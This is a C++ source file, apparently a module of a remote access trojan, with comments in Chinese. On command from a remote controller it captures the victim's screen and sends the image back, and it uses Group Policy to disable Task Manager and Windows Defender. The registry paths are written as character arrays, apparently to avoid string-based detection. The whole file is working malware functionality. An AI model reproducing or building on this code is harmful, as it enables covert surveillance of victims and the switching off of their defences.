#define INITGUID
#include "ToolsManager.h"
#include<wingdi.h>
#include <GPEdit.h>
#include <winnt.h>

#define TAG_DEV_PLAS  1
#define BITS_PER_PIX  32
#define NO_COLOR_TAB  0
#define UNCMP_RGB     0
#define H_RESOL_0     0
#define V_RESOL_0     0
#define ALL_COLOR     0
#define MUST_ZERO     0
#define TYPE_BMP      0x4D42
#define FILE_HEAD     sizeof(BITMAPFILEHEADER)
#define INFO_HEAD     sizeof(BITMAPINFOHEADER)
#define HEAD_SIZE     sizeof(BITMAPINFOHEADER) + sizeof(BITMAPFILEHEADER)


CToolsManager::CToolsManager(CClientSocket* pClient) :CManager(pClient)
{
	BYTE buff = TOKEN_TOOLS;
	Send(&buff,1);
}

CToolsManager::~CToolsManager()
{
	//ExitProcess(0);
}

void CToolsManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{

		case DESK_TOP: SendScreenshots(); break;
		case DISABLE_TASK:SetTDisableTaskMgr(1); break;
		case ENABLE_TASK:SetTDisableTaskMgr(0); break;
		case DISABLE_DEF:SetTDisableDef(1); break;
		case ENABLE_DEF:SetTDisableDef(0); break;	
	}
}
void CToolsManager::SendScreenshots()
{
	// 获得显示器
	HDC hCurrScreen = GetDC(NULL);
	//创建一个兼容的DC,在内存中表示当前位图的上下文
	HDC hCmpDC = CreateCompatibleDC(hCurrScreen);
	//宽高
	int iScreenWidth = GetDeviceCaps(hCurrScreen, HORZRES);
	int iScreenHeight = GetDeviceCaps(hCurrScreen, VERTRES);
	//当前屏幕位图
	HBITMAP hBmp = CreateCompatibleBitmap(hCurrScreen, iScreenWidth, iScreenHeight);
	//用当前位图句柄表示内存中屏幕位图上下文
	SelectObject(hCmpDC, hBmp);
	//将当前屏幕图像复制到内存中
	BOOL ret = BitBlt(hCmpDC, 0, 0, iScreenWidth, iScreenHeight, hCurrScreen, 0, 0, SRCCOPY);
	//BMP图像信息头
	BITMAPINFOHEADER hBmpInfo;
	hBmpInfo.biSize = INFO_HEAD;
	hBmpInfo.biWidth = iScreenWidth;
	hBmpInfo.biHeight = iScreenHeight;
	hBmpInfo.biPlanes = TAG_DEV_PLAS;
	hBmpInfo.biClrUsed = NO_COLOR_TAB;
	hBmpInfo.biBitCount = BITS_PER_PIX;
	hBmpInfo.biSizeImage = UNCMP_RGB;
	hBmpInfo.biCompression = BI_RGB;
	hBmpInfo.biClrImportant = ALL_COLOR;
	hBmpInfo.biXPelsPerMeter = H_RESOL_0;
	hBmpInfo.biYPelsPerMeter = V_RESOL_0;

	/* * * * * * * * * * * * * * * * * * * *
	 * Windows按4字节分配内存
	 * 首先计算每行所需要的bit数,并按4字节对齐
	 * 对齐后的数据乘4,从DWORD转为BYTE
	 * 每行实际所占BYTE乘图像列数得到数据源大小
	 * * * * * * * * * * * * * * * * * * * */
	DWORD dwSrcSize = ((iScreenWidth * hBmpInfo.biBitCount + 31) / 32) * 4 * iScreenHeight;
	//截图总大小
	DWORD dwPicSize = HEAD_SIZE + dwSrcSize;
	//BMP图像文件头
	BITMAPFILEHEADER hBmpFile;
	hBmpFile.bfSize = dwPicSize;
	hBmpFile.bfType = TYPE_BMP;
	hBmpFile.bfOffBits = HEAD_SIZE;
	hBmpFile.bfReserved1 = MUST_ZERO;
	hBmpFile.bfReserved2 = MUST_ZERO;
	//BMP图像数据源
	char* bmpSrc = new char[dwSrcSize];
	ZeroMemory(bmpSrc, dwSrcSize);
	//检索指定的兼容位图中的所有位元数据
	//并复制到指定格式的设备无关位图的缓存中
	GetDIBits(hCmpDC, hBmp, 0, (UINT)iScreenHeight, bmpSrc, (BITMAPINFO*)&hBmpInfo, DIB_RGB_COLORS);
	//汇总所有数据信息
	char* szBmp = new char[dwPicSize];
	ZeroMemory(szBmp, dwPicSize);
	memcpy(szBmp, (void*)&hBmpFile, FILE_HEAD);
	memcpy(szBmp + FILE_HEAD, (void*)&hBmpInfo, INFO_HEAD);
	memcpy(szBmp + HEAD_SIZE, bmpSrc, dwSrcSize);
	LPBYTE	lpPacket = new BYTE[dwPicSize + 1];
	lpPacket[0] = DESK_TOP;
	memcpy(lpPacket + 1, szBmp, dwPicSize);
	m_pClient->Send(lpPacket, dwPicSize + 1);
	//释放资源
	DeleteObject(hBmp);
	DeleteObject(hCmpDC);
	ReleaseDC(NULL, hCurrScreen);
	delete[] szBmp;
	delete[] bmpSrc;
	delete[] lpPacket;
	szBmp = nullptr;
	bmpSrc = nullptr;
}

//是否禁用任务管理器
void CToolsManager::SetTDisableTaskMgr(BOOL swiTch)
{
	char path[] = { 'S','o','f','t','w','a','r','e','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','P','o','l','i','c','i','e','s','\\','S','y','s','t','e','m',0};
	SetGroupPolicy(GPO_SECTION_USER, path,"DisableTaskMgr", swiTch);
	BYTE ret = OK;
	Send(&ret, 1);
}

/// <summary>
///  修改组策略
/// </summary>
/// <param name="dwSection">GPO_SECTION_MACHINE 或者 GPO_SECTION_USER 代表注册表的跟路径</param>
/// <param name="RegPath">修改的注册表路径</param>
/// <param name="Regkey">注册表的键</param>
/// <param name="swiTch">注册表的值</param>
void CToolsManager::SetGroupPolicy(DWORD dwSection, char* RegPath, char* Regkey, DWORD  swiTch)
{
	if (::CoInitialize(NULL) != S_OK)
		return;

	LRESULT																		status;
	LRESULT																		hr = S_OK;
	IGroupPolicyObject*													pGPO = NULL;
	HKEY																			hKey = NULL;

	//创建实例
	hr = CoCreateInstance(CLSID_GroupPolicyObject, NULL, CLSCTX_INPROC_SERVER, IID_IGroupPolicyObject, (LPVOID*)&pGPO);
	if (hr != S_OK)
	{
		::CoUninitialize();
		return;
	}

	//打开注册表
	HKEY hGPOKey = 0;
	hr = pGPO->OpenLocalMachineGPO(GPO_OPEN_LOAD_REGISTRY);
	if (SUCCEEDED(hr))
	{
		//获取注册表
		hr = pGPO->GetRegistryKey(dwSection, &hGPOKey);
		if (SUCCEEDED(hr))
		{
			//注册表项不存在时就创建一下
			status = RegOpenKeyEx(hGPOKey, RegPath, 0, KEY_WRITE, &hKey);
			if (status != ERROR_SUCCESS)
			{
				status = RegCreateKeyEx(hGPOKey, RegPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
			}
			
			//设置注册表
			DWORD lpData = swiTch;
			status = RegSetKeyValue(hKey, NULL, Regkey, REG_DWORD, (LPCVOID)&lpData, 4);

			RegCloseKey(hKey);

			RegCloseKey(hGPOKey);

			GUID Registerid = REGISTRY_EXTENSION_GUID;
			GUID ThisGuid = {
				0x0F6B957E,
				0x509E,
				0x11D1,
				{0xA7, 0xCC, 0x00, 0x00, 0xF8, 0x75, 0x71, 0xE3}
			};
			if (dwSection == GPO_SECTION_MACHINE)
			{
				//更新到计算机策略
				status = pGPO->Save(TRUE, TRUE, &Registerid, &ThisGuid);
			}
			else
			{
				//更新到用户策略
				status = pGPO->Save(FALSE, TRUE, &Registerid, &ThisGuid);
			}
			pGPO->Release();
		}
	}
	::CoUninitialize();
}

//是否禁用windows def
void CToolsManager::SetTDisableDef(BOOL swiTch)
{
	char path[] = { 'S','o','f','t','w','a','r','e','\\','P','o','l','i','c','i','e','s','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s',' ','D','e','f','e','n','d','e','r',0};
	SetGroupPolicy(GPO_SECTION_MACHINE, path, "DisableAntiSpyware", swiTch);
	BYTE ret = OK;
	Send(&ret, 1);
}